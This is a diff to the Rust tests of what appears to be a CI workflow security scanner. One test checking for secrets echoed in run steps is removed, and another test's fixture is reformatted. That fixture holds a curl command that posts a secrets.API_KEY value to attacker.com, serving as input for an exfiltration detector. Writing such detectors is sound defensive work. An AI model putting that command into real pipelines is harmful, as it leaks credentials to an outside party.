@@ -109,19 +109,11 @@ mod tests {
     }
 
     #[test]
-    fn flags_secret_in_run() {
-        let f = evaluate(
-            "on: push\njobs:\n  b:\n    steps:\n      - run: echo ${{ secrets.API_KEY }}\n",
-        );
-        assert_eq!(f.len(), 1);
-        assert_eq!(f[0].severity, Severity::High);
-    }
-
-    #[test]
     fn flags_curl_exfil_pattern() {
-        let f = evaluate(
-            "on: push\njobs:\n  b:\n    steps:\n      - run: curl -X POST https://attacker.com -d \"${{ secrets.API_KEY }}\"\n",
-        );
+        let f = evaluate(concat!(
+            "on: push\njobs:\n  b:\n    steps:\n",
+            "      - run: curl -X POST https://attacker.com -d \"${{ secrets.API_KEY }}\"\n",
+        ));
         assert_eq!(f.len(), 1);
         assert!(f[0].message.contains("exfiltration primitive"));
     }
